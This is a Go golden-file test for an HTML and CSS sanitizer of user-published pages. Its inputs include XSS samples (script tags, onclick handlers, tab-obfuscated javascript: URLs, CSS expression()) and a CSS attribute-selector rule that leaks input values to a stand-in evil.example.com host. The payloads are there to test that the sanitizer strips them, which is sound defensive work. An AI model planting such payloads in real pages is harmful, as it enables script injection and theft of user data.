package usercontent_test

import (
	"bytes"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"testing"

	"github.com/gobeaver/go-beaver-tag-sanitization/usercontent"
	"github.com/gobeaver/go-beaver-tag-sanitization/usercontent/profiles"
)

var update = flag.Bool("update", false, "rewrite the golden files")

// Golden tests pin the exact output of each built-in profile.
//
// Profile.Version drives lazy re-sanitization: when it moves, the
// page service re-runs stored raw content through the sanitizer and
// replaces what it serves. That makes output a compatibility
// surface, not an implementation detail — a refactor that silently
// changes it silently changes every published page. These files are
// the record of what each version produces.
//
// If a change here is intended, bump the profile's Version and
// regenerate:
//
//	go test ./usercontent/ -run TestGolden -update
func TestGolden(t *testing.T) {
	cases := []struct {
		name string
		in   string
	}{
		{"plain", "<h1>Hello</h1><p>A <strong>short</strong> page.</p>"},
		{"links", `<a href="/about">rel</a><a href="https://example.com" target="_blank">abs</a>`},
		{"link_with_rel", `<a href="/x" rel="author noopener" target="_blank">x</a>`},
		{"images", `<img src="/assets/a.png" alt="a" width="10" height="10"><img src="https://evil.example.com/b.png">`},
		{"data_image", `<img src="data:image/png;base64,AAAA" alt="d"><img src="data:image/svg+xml,<svg/>">`},
		{"script", "<p>before</p><script>alert(1)</script><p>after</p>"},
		{"handlers", `<p onclick="alert(1)" class="keep" id="gb-shell-x">t</p>`},
		{"js_url", `<a href="javascript:alert(1)">a</a><a href="java&#9;script:alert(1)">b</a>`},
		{"nesting", "<div><section><p>deep <em>and <strong>deeper</strong></em></p></section></div>"},
		{"unclosed", "<div><p>one<p>two<span>three"},
		{"self_closing", "<a/><br/><img/><p/>"},
		{"table", `<table><thead><tr><th scope="col">h</th></tr></thead><tbody><tr><td colspan="2">c</td></tr></tbody></table>`},
		{"entities", "<p>a &amp; b &lt; c &#65; &copy;</p>"},
		{"comment", "<p>a<!-- secret -->b</p>"},
		{"foreign", "<svg><circle/></svg><math><mi>x</mi></math>"},
		{"srcset", `<source srcset="/assets/a.png 1x, /assets/b.png 2x" type="image/png">`},
	}
	cssCases := []struct {
		name string
		in   string
	}{
		{"basic", "h1 { color: navy; margin: 0 0 1rem }"},
		{"media", "@media screen and (min-width: 600px) { p { color: red } h1 { font-size: 2rem } }"},
		{"supports", "@supports (display:grid) { .g { display: grid } }"},
		{"nested_media", "@media screen { @media print { p { color: red } } }"},
		{"functions", ".c { width: calc(100% - 2rem); color: rgb(1 2 3 / .5); background: linear-gradient(180deg,#fff,#eee) }"},
		{"url_ok", ".h { background-image: url('/assets/hero.png') }"},
		{"url_bad", ".h { background-image: url('https://evil.example.com/x.png') }"},
		{"forbidden", "@import url('https://evil.example.com/x.css'); p { width: expression(alert(1)) }"},
		{"universal", "* { color: red } .ok { color: blue }"},
		{"shell_ns", ".gb-shell-main { color: red } .mine { color: blue }"},
		{"attr_selector", `input[value^="a"] { background: url("https://evil.example.com/?c=a") }`},
		{"custom_props", ":where(.t) { --brand: #06f; color: var(--brand) }"},
		{"comments", "/* c */ p /* c */ { color: red /* c */ }"},
		{"pseudo", "a:hover { color: red } a:has(b) { color: blue }"},
	}

	for _, profileName := range []string{"fullpage", "embed"} {
		t.Run(profileName, func(t *testing.T) {
			p := profiles.ProfileFullPage()
			if profileName == "embed" {
				p = profiles.ProfileEmbed()
			}
			s, err := usercontent.New(p)
			if err != nil {
				t.Fatal(err)
			}

			var buf bytes.Buffer
			fmt.Fprintf(&buf, "profile: %s\nversion: %d\n", p.Name, p.Version)

			buf.WriteString("\n=== HTML ===\n")
			for _, c := range cases {
				out, rep, err := s.SanitizeHTML(c.in)
				writeCase(&buf, c.name, c.in, out, rep, err)
			}
			buf.WriteString("\n=== CSS ===\n")
			for _, c := range cssCases {
				out, rep, err := s.SanitizeCSS(c.in)
				writeCase(&buf, c.name, c.in, out, rep, err)
			}

			path := filepath.Join("testdata", "golden", profileName+".txt")
			compareGolden(t, path, buf.Bytes())
		})
	}
}

func writeCase(buf *bytes.Buffer, name, in, out string, rep usercontent.Report, err error) {
	fmt.Fprintf(buf, "\n--- %s\nin  : %q\n", name, in)
	if err != nil {
		fmt.Fprintf(buf, "err : %v\n", err)
		return
	}
	fmt.Fprintf(buf, "out : %q\n", out)
	for _, r := range rep.Removed {
		fmt.Fprintf(buf, "drop: %s %q (%s)\n", r.Kind, r.Value, r.Reason)
	}
}

func compareGolden(t *testing.T, path string, got []byte) {
	t.Helper()
	if *update {
		if err := os.MkdirAll(filepath.Dir(path), 0o750); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, got, 0o600); err != nil {
			t.Fatal(err)
		}
		t.Logf("wrote %s", path)
		return
	}
	want, err := os.ReadFile(path) // #nosec G304 -- test fixture path
	if err != nil {
		t.Fatalf("missing golden file %s (regenerate with -update): %v", path, err)
	}
	if !bytes.Equal(got, want) {
		t.Errorf("output for %s changed.\n\n"+
			"If this is intended, bump the profile's Version — stored pages are\n"+
			"re-sanitized when it moves — then run:\n"+
			"  go test ./usercontent/ -run TestGolden -update\n\n%s",
			path, firstDiff(want, got))
	}
}

// firstDiff reports the first differing line, which is far easier to
// read than a full dump of two large fixtures.
func firstDiff(want, got []byte) string {
	wl, gl := bytes.Split(want, []byte("\n")), bytes.Split(got, []byte("\n"))
	for i := 0; i < len(wl) || i < len(gl); i++ {
		var w, g []byte
		if i < len(wl) {
			w = wl[i]
		}
		if i < len(gl) {
			g = gl[i]
		}
		if !bytes.Equal(w, g) {
			return fmt.Sprintf("first difference at line %d:\n  want: %s\n  got : %s", i+1, w, g)
		}
	}
	return "files differ only in trailing bytes"
}
